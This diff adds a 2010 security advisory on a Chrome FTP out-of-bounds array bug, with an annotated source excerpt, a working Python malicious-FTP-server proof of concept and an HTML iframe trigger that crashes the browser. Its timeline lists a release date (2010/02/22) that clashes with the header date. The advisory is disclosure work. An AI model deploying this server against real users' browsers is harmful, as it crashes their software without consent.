@@ -1,0 +1,249 @@
+-----BEGIN PGP SIGNED MESSAGE-----
+Hash: SHA1
+
+Advisory:               Google Chrome OOB Array Indexing Bug 
+Advisory ID:            TKADV2010-004
+Revision:               1.0
+Release Date:           2010/03/31
+Last Modified:          2010/03/31
+Date Reported:          2010/03/21
+Author:                 Tobias Klein (tk at trapkit.de)
+Affected Software:      Google Chrome <= 4.1.249.1042 (Build 42199)
+Remotely Exploitable:   Yes
+Locally Exploitable:    No
+Vendor URL:             http://www.google.com/chrome/
+Vendor Status:          Vendor has released an updated version
+
+
+======================
+Vulnerability Details:
+======================
+
+Google Chrome is vulnerable to an out-of-bounds array indexing bug, caused 
+by the improper handling of FTP PWD command server responses. By persuading
+a victim to visit a specially-crafted web site containing an iframe 
+pointing to a malicious FTP server, a remote attacker could exploit this 
+bug and cause the browser to crash.
+
+This bug affects the trusted browser kernel (privileged supervisor of the 
+activities of the sandboxed processes).
+
+Tested Chrome version (Microsoft Windows):
+
+Google Chrome   4.1.249.1042 (Build 42199)
+WebKit	        532.5
+V8              1.3.18.22
+User Agent      Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) 
+                AppleWebKit/532.5 (KHTML, like Gecko) 
+                Chrome/4.1.249.1042 Safari/532.5
+
+
+==================
+Technical Details:
+==================
+
+File: net\ftp\ftp_network_transaction.cc
+
+[..]
+int FtpNetworkTransaction::ProcessResponsePWD(const FtpCtrlResponse&
+response) {
+  switch (GetErrorClass(response.status_code)) {
+    case ERROR_CLASS_INITIATED:
+      return Stop(ERR_INVALID_RESPONSE);
+    case ERROR_CLASS_OK: {
+      // The info we look for should be on the first line.
+[1]   std::string line = response.lines[0];
+      if (line.empty())
+        return Stop(ERR_INVALID_RESPONSE);
+[2]   std::string::size_type quote_pos = line.find('"');
+      if (quote_pos != std::string::npos) {
+[3]     line = line.substr(quote_pos + 1);
+[4]     quote_pos = line.find('"');
+        if (quote_pos == std::string::npos)
+          return Stop(ERR_INVALID_RESPONSE);
+[5]     line = line.substr(0, quote_pos);
+      }
+      if (system_type_ == SYSTEM_TYPE_VMS)
+        line = FtpUtil::VMSPathToUnix(line);
+[6]   if (line[line.length() - 1] == '/')
+        line.erase(line.length() - 1);
+      current_remote_directory_ = line;
+      next_state_ = STATE_CTRL_WRITE_TYPE;
+      break;
+    }
+    case ERROR_CLASS_INFO_NEEDED:
+      return Stop(ERR_INVALID_RESPONSE);
+    case ERROR_CLASS_TRANSIENT_ERROR:
+      return Stop(ERR_FAILED);
+    case ERROR_CLASS_PERMANENT_ERROR:
+      return Stop(ERR_FAILED);
+    default:
+      NOTREACHED();
+      return Stop(ERR_UNEXPECTED);
+  }
+  return OK;
+}
+[..]
+
+[1] The string 'line' points to the FTP server response.
+[2] Search for the first double quote (") in the response.
+[3] Point one byte after the first double quote.
+[4] Find the next double quote.
+[5] Extract the substring from the current position until the second   
+    double quote.
+[6] Check the extracted substring for a '/'.
+
+If the FTP server response consists of two double quotes followed directly 
+after each other the code at [5] will result in a substring with a length 
+of zero bytes. This leads to an out-of-bounds array index 
+(line[0xffffffff]) at [6] that results in an application crash.
+ 
+
+=================
+Proof of Concept:
+=================
+
+Malicious FTP server:
+
+K:\BUGS\CHROME>type poc.py
+from socket import *
+from struct import pack
+from time import sleep
+
+host = "0.0.0.0"
+port = 21
+
+s = socket(AF_INET, SOCK_STREAM)
+s.bind((host, port))
+s.listen(1)
+print "\n[+] Google Chrome (4.1.249.1042) Denial of Service poc"
+print "[+] Listening on port %d ..." % port
+
+cl, addr = s.accept()
+print "[+] Connection accepted from %s" % addr[0]
+
+buffer = "220 Google Chrome (4.1.249.1042) Denial of Service poc"
+buffer += "\r\n"
+cl.send(buffer)
+
+cl.recv(128)
+buffer = "331 Password required for anonymous."
+buffer += "\r\n"
+cl.send(buffer)
+
+cl.recv(128)
+buffer = "230 User anonymous logged in."
+buffer += "\r\n"
+cl.send(buffer)
+
+cl.recv(128)
+buffer = "215 UNIX Type: bib"
+buffer += "\r\n"
+cl.send(buffer)
+
+cl.recv(128)
+buffer = "257 \"\""
+buffer += "\r\n"
+cl.send(buffer)
+
+print "[+] Sending buffer: OK\n"
+
+sleep(1)
+cl.close()
+s.close()
+- - - - - ---
+
+Start the poc server:
+
+K:\BUGS\CHROME>python poc.py
+
+[+] Google Chrome (4.1.249.1042) Denial of Service poc
+[+] Listening on port 21 ...
+
+
+Open the following sample HTML page in Chrome:
+
+- - - - - ---
+<html>
+ <body>
+  <iframe name="POC" src="ftp://127.0.0.1">
+ </body>
+<html>
+- - - - - ---
+
+
+========= 
+Solution: 
+=========
+
+  Update to Google Chrome >= 4.1.249.1045.
+
+
+==================== 
+Disclosure Timeline: 
+====================
+  
+  Format: year/month/day
+  
+  2010/03/21 - Chromium maintainers notified
+  2010/03/22 - Patch developed by Chromium maintainers
+  2010/03/30 - Fixed version of Google Chrome is available
+  2010/02/22 - Release date of this security advisory
+
+
+======== 
+Credits: 
+========
+
+  Vulnerability found and advisory written by Tobias Klein.
+
+
+=========== 
+References: 
+===========
+
+ [REF1] http://googlechromereleases.blogspot.com/2010/03/stable-update-
+        disable-translate.html
+ [REF2] http://bugs.chromium.org/38845
+ [REF3] http://www.trapkit.de/advisories/TKADV2010-004.txt
+
+
+======== 
+Changes: 
+========
+
+  Revision 0.1 - Initial draft release to the vendor
+  Revision 1.0 - Public release
+
+
+===========
+Disclaimer:
+===========
+
+The information within this advisory may change without notice. Use
+of this information constitutes acceptance for use in an AS IS
+condition. There are no warranties, implied or express, with regard
+to this information. In no event shall the author be liable for any
+direct or indirect damages whatsoever arising out of or in connection
+with the use or spread of this information. Any use of this
+information is at the user's own risk.
+
+
+================== 
+PGP Signature Key: 
+==================
+
+  http://www.trapkit.de/advisories/tk-advisories-signature-key.asc
+
+  
+Copyright 2010 Tobias Klein. All rights reserved.
+
+
+-----BEGIN PGP SIGNATURE-----
+Version: PGP
+Charset: utf-8
+
+wj8DBQFLs6gPkXxgcAIbhEERAlH6AKD+UgqYNZpBD40+o7Yl8HjdsaVM1QCffMKa
+pqw8f2DGxim/+N1k+jCqbcQ=
+=mHHh
+-----END PGP SIGNATURE-----
